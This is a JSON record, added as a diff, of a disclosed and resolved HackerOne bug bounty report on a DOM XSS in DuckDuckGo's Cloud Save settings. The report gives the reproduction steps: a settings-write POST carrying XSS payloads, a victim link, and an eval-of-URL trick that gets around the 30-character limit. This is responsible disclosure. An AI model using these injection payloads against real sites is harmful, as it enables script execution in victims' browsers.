@@ -1,0 +1,149 @@
+{
+  "id": 921635,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MjE2MzU=",
+  "url": "https://hackerone.com/reports/921635",
+  "title": "DOM XSS on duckduckgo.com search",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2020-07-12T18:07:27.265Z",
+  "submitted_at": "2020-07-12T18:07:27.265Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "sijisu",
+    "url": "/sijisu",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ifesz31kDzdrxysGYipHkzRB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 10995,
+    "url": "https://hackerone.com/duckduckgo",
+    "handle": "duckduckgo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4mpaehke5u0ubioeqvys0hcesjle/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "DuckDuckGo",
+      "twitter_handle": "duckduckgo",
+      "website": "https://duckduckgo.com",
+      "about": "Independent online protection company. Get our mobile & desktop browser with protections built-in, including our search engine that doesn’t track you."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-08-20T15:49:37.725Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-07-21T15:49:33.955Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hey there,\n\nthere is a DOM XXS vulnerability on the https://duckduckgo.com/ search result page through the `kp` and `kae` parameters of the [Cloud Save](https://help.duckduckgo.com/duckduckgo-help-pages/settings/cloud-save/) feature.\n\nPOC URL: https://duckduckgo.com/?q=s&key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070325\n\nVideo (Firefox 78.0.1): \n{F904609}\n\nVideo (Chromium 83.0.4103.116): \n{F904637}\n\n## How to reproduce?\n\nFirst, we need to create malicious \"Cloud Save\" setting with our XSS payloads, an attacker would do that on their computer, we can do that with the following request to duckduckgo.com:\n\n```\nPOST /settings.js HTTP/1.1\nHost: duckduckgo.com\nContent-Length: 248\n\n{\n\"command\":\"write\",\n\"objectKey\":\"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff\",\n\"obj\":{\n\"kp\":\"\\\"><img src=/ onerror=alert(1)>\",\n\"kae\":\"\\\"><img src=/ onerror=alert(2)>\"\n}\n}\n```\n\nNow we just need to visit duckduckgo.com with the key parameter set, an attacker would send this link to the victim, like this: https://duckduckgo.com/?q=a&key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce0703ff. The Cloud Save key is now saved in the browser's Local Storage. Because the settings are downloaded from Cloud Save on every visit of the results page, our code will be executed every time as well. Try searching https://duckduckgo.com/?q=a, it even triggers on the settings page https://duckduckgo.com/settings and others.\n\n## What about longer payloads?\n\nYou cannot have Cloud Save settings property longer than 30 characters. However, there are many tricks on how to bypass this limitation. For example one of many great @terjanq 's payloads does the trick here. It evals the URL so you can make your payload long enough to execute malicious code.\n\nRequest to set up Cloud Save:\n\n```\nPOST /settings.js HTTP/1.1\nHost: duckduckgo.com\nContent-Length: 211\n\n{\n\"command\":\"write\",\n\"objectKey\":\"bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324\",\n\"obj\":{\n\"kp\":\"\\\"><svg/onload=eval(`'`+URL)>\"\n}\n}\n```\n\nAnd URL that executes the code: https://duckduckgo.com/?q=s&key=bb6e45e894d7b1f3a2619df967be873b15f8eccd55d3a729f58429b59f72431e4fd4b736a0ae5cf74933bcb5136103e1c09664972b3c489d1b682f08ce070324#';alert(document.domain);\n\nVideo:\n{F904653}\n\n## Impact\n\nAttacker can execute JavaScript.",
+  "weakness": {
+    "id": 63,
+    "name": "Cross-site Scripting (XSS) - DOM"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 904609,
+      "file_name": "firefox2-2020-07-12_19.04.05.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sdWcfWmVDwrLLrwa4NRCf7nK?response-content-disposition=attachment%3B%20filename%3D%22firefox2-2020-07-12_19.04.05.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox2-2020-07-12_19.04.05.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYNXMROI%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T001020Z&X-Amz-Expires=694&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC8IkEZzamf6ZYusb%2FpSAF4XSeKTPksx736k%2FqCglmVowIhAKxhaZSwTQhQtHm4n1DZb3qc7bj4NWTE43eYwNrdmR69KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxPD1mlTaYI5akgu2MqjgUeHxSASquiAsrb1XogKZsBC00GbfFlctRxkOKuzReD6IKGkeKONZYfdE04W1VBt9oXFYgVHzko2kkM38H0Y0u4kb12dz55TrA2e7q7Qkre5xtv1RG06qg8DgHu7Jxze0wCmQaBVDm1TSxoNdjtK5lLjZckJdqWUmD%2FXvo6RrA5z8YwUeVWTc71x2jmE8lBmapK4i%2FuGFUFYAUGJEFv%2Bs%2BC1ZgMI%2FtUG2un7V4rY%2Br7o6URCyk5n8GCN5Pq3dCQfj45Xbi879CAqc1%2FkNDeTfIuOTE4p9f8He3%2BKTvxwm%2BVLs%2FG5DeZ5TTpv%2FmiUVDIyEjxC2L%2BSZnyjZKP4HhKzCCOheIADUB3fmPo%2BkQhmV7Em43TKNTfRtCOOv3fQ0TzNm%2FzhDZdNghV52dcmgdFjlVIV7cUWKQvPFWm76b0eKQvNbsj9ENmVkrr5hBAzpT%2BbO00HKAd8rkEmyoFNWYEm5Ee5M9PPNDy1as%2BV4qLOecAn5A1tSN3lEsZ8bKIyMieA4zJxBW45CwfzlMWvGRzvm42KdcjgIx7tDVdezOKURFFf%2FHeU4wM1YVCfBw9jXVsMhLnii7%2BBT8dD6nBag5lPHogVHaeFM84bms1hWdaGk3GDhGwnVWIqAwpKRHBBxiAHtIrHyl4%2BAcG7FHefXM8tintpdqgX5wFBtmF3JkMcWeB%2B0EejaiyBX2Gh%2Fl7WfwQXPEotIjtW6d%2F52HY2CD1CyPC5oKby9aovgOgHz1I%2Fqe7jrMxHJb6FRx9SfLXwDBkZCGoDTiYnFoUr8H8bZwqNJmaQecNO7zVWMp4RW4q63a1UIfjWApUrW5j1A%2Brk%2F43eSlM3xA6MbkjbexIXxqhiInnM04Pd6F17CTzeGf7pWswn8nizAY6sAE60gVb%2Bdw28aawyMSx6Z%2Be6HuvhZjet4TLpuu3UdqI3OIxy88qhZfQ7amajGKJLHtgzDwI9THXujLG%2FzM7%2BRTzaFj8IvaRa66000MrJvqu9P8lUyeFGHRxqiarKtRlxyb2PcYUhlTMwAYFgROli0FllDdP0i53u%2FpTznVyNTzrI8GqnU4bAzwbsM%2BlcnyTUhO9Ad%2BNrCi%2Fb0UwMRJFzoJzU22mp0LnQ6UM0h0nR%2Bp7bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=afc7741073fb102ebee0767ffd3b0a9fc42eb74b8b4333069bfafd6f8d8b8618",
+      "file_size": 1799206,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 904637,
+      "file_name": "chromium2-2020-07-12_19.36.47.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ytuzBbf82jA7u61ALBTsiZW3?response-content-disposition=attachment%3B%20filename%3D%22chromium2-2020-07-12_19.36.47.mp4%22%3B%20filename%2A%3DUTF-8%27%27chromium2-2020-07-12_19.36.47.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYNXMROI%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T001020Z&X-Amz-Expires=694&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC8IkEZzamf6ZYusb%2FpSAF4XSeKTPksx736k%2FqCglmVowIhAKxhaZSwTQhQtHm4n1DZb3qc7bj4NWTE43eYwNrdmR69KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxPD1mlTaYI5akgu2MqjgUeHxSASquiAsrb1XogKZsBC00GbfFlctRxkOKuzReD6IKGkeKONZYfdE04W1VBt9oXFYgVHzko2kkM38H0Y0u4kb12dz55TrA2e7q7Qkre5xtv1RG06qg8DgHu7Jxze0wCmQaBVDm1TSxoNdjtK5lLjZckJdqWUmD%2FXvo6RrA5z8YwUeVWTc71x2jmE8lBmapK4i%2FuGFUFYAUGJEFv%2Bs%2BC1ZgMI%2FtUG2un7V4rY%2Br7o6URCyk5n8GCN5Pq3dCQfj45Xbi879CAqc1%2FkNDeTfIuOTE4p9f8He3%2BKTvxwm%2BVLs%2FG5DeZ5TTpv%2FmiUVDIyEjxC2L%2BSZnyjZKP4HhKzCCOheIADUB3fmPo%2BkQhmV7Em43TKNTfRtCOOv3fQ0TzNm%2FzhDZdNghV52dcmgdFjlVIV7cUWKQvPFWm76b0eKQvNbsj9ENmVkrr5hBAzpT%2BbO00HKAd8rkEmyoFNWYEm5Ee5M9PPNDy1as%2BV4qLOecAn5A1tSN3lEsZ8bKIyMieA4zJxBW45CwfzlMWvGRzvm42KdcjgIx7tDVdezOKURFFf%2FHeU4wM1YVCfBw9jXVsMhLnii7%2BBT8dD6nBag5lPHogVHaeFM84bms1hWdaGk3GDhGwnVWIqAwpKRHBBxiAHtIrHyl4%2BAcG7FHefXM8tintpdqgX5wFBtmF3JkMcWeB%2B0EejaiyBX2Gh%2Fl7WfwQXPEotIjtW6d%2F52HY2CD1CyPC5oKby9aovgOgHz1I%2Fqe7jrMxHJb6FRx9SfLXwDBkZCGoDTiYnFoUr8H8bZwqNJmaQecNO7zVWMp4RW4q63a1UIfjWApUrW5j1A%2Brk%2F43eSlM3xA6MbkjbexIXxqhiInnM04Pd6F17CTzeGf7pWswn8nizAY6sAE60gVb%2Bdw28aawyMSx6Z%2Be6HuvhZjet4TLpuu3UdqI3OIxy88qhZfQ7amajGKJLHtgzDwI9THXujLG%2FzM7%2BRTzaFj8IvaRa66000MrJvqu9P8lUyeFGHRxqiarKtRlxyb2PcYUhlTMwAYFgROli0FllDdP0i53u%2FpTznVyNTzrI8GqnU4bAzwbsM%2BlcnyTUhO9Ad%2BNrCi%2Fb0UwMRJFzoJzU22mp0LnQ6UM0h0nR%2Bp7bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b34a443e3e3e2718a14d52832203091333dd1b51284a619410cb1066568849c9",
+      "file_size": 1535136,
+      "type": "video/mp4",
+      "moderated": null
+    },
+    {
+      "id": 904653,
+      "file_name": "firefox3-2020-07-12_19.59.04.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/wRgY6vRS32iwaTEVvrsPM8Ut?response-content-disposition=attachment%3B%20filename%3D%22firefox3-2020-07-12_19.59.04.mp4%22%3B%20filename%2A%3DUTF-8%27%27firefox3-2020-07-12_19.59.04.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUYNXMROI%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T001020Z&X-Amz-Expires=694&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC8IkEZzamf6ZYusb%2FpSAF4XSeKTPksx736k%2FqCglmVowIhAKxhaZSwTQhQtHm4n1DZb3qc7bj4NWTE43eYwNrdmR69KroFCJv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAxoMMDEzNjE5Mjc0ODQ5IgxPD1mlTaYI5akgu2MqjgUeHxSASquiAsrb1XogKZsBC00GbfFlctRxkOKuzReD6IKGkeKONZYfdE04W1VBt9oXFYgVHzko2kkM38H0Y0u4kb12dz55TrA2e7q7Qkre5xtv1RG06qg8DgHu7Jxze0wCmQaBVDm1TSxoNdjtK5lLjZckJdqWUmD%2FXvo6RrA5z8YwUeVWTc71x2jmE8lBmapK4i%2FuGFUFYAUGJEFv%2Bs%2BC1ZgMI%2FtUG2un7V4rY%2Br7o6URCyk5n8GCN5Pq3dCQfj45Xbi879CAqc1%2FkNDeTfIuOTE4p9f8He3%2BKTvxwm%2BVLs%2FG5DeZ5TTpv%2FmiUVDIyEjxC2L%2BSZnyjZKP4HhKzCCOheIADUB3fmPo%2BkQhmV7Em43TKNTfRtCOOv3fQ0TzNm%2FzhDZdNghV52dcmgdFjlVIV7cUWKQvPFWm76b0eKQvNbsj9ENmVkrr5hBAzpT%2BbO00HKAd8rkEmyoFNWYEm5Ee5M9PPNDy1as%2BV4qLOecAn5A1tSN3lEsZ8bKIyMieA4zJxBW45CwfzlMWvGRzvm42KdcjgIx7tDVdezOKURFFf%2FHeU4wM1YVCfBw9jXVsMhLnii7%2BBT8dD6nBag5lPHogVHaeFM84bms1hWdaGk3GDhGwnVWIqAwpKRHBBxiAHtIrHyl4%2BAcG7FHefXM8tintpdqgX5wFBtmF3JkMcWeB%2B0EejaiyBX2Gh%2Fl7WfwQXPEotIjtW6d%2F52HY2CD1CyPC5oKby9aovgOgHz1I%2Fqe7jrMxHJb6FRx9SfLXwDBkZCGoDTiYnFoUr8H8bZwqNJmaQecNO7zVWMp4RW4q63a1UIfjWApUrW5j1A%2Brk%2F43eSlM3xA6MbkjbexIXxqhiInnM04Pd6F17CTzeGf7pWswn8nizAY6sAE60gVb%2Bdw28aawyMSx6Z%2Be6HuvhZjet4TLpuu3UdqI3OIxy88qhZfQ7amajGKJLHtgzDwI9THXujLG%2FzM7%2BRTzaFj8IvaRa66000MrJvqu9P8lUyeFGHRxqiarKtRlxyb2PcYUhlTMwAYFgROli0FllDdP0i53u%2FpTznVyNTzrI8GqnU4bAzwbsM%2BlcnyTUhO9Ad%2BNrCi%2Fb0UwMRJFzoJzU22mp0LnQ6UM0h0nR%2Bp7bg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=298c3953e5afd7c0e8fbcd9dbb56acba0c568ced426c5b36e6b28bb755ef5ce9",
+      "file_size": 451306,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-08-20T15:49:34.022Z",
+  "allow_singular_disclosure_after": -173694046.14791864,
+  "singular_disclosure_allowed": true,
+  "vote_count": 30,
+  "voters": [
+    "canarinho_pistola",
+    "xploiterr",
+    "spam404",
+    "leonishan",
+    "0xwise",
+    "sa1tama0",
+    "b3a1a330f9c63928c5d2615",
+    "jesuser14",
+    "geminied",
+    "helphen",
+    "and 20 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 8671,
+    "asset_type": "WILDCARD",
+    "asset_identifier": "*.duckduckgo.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
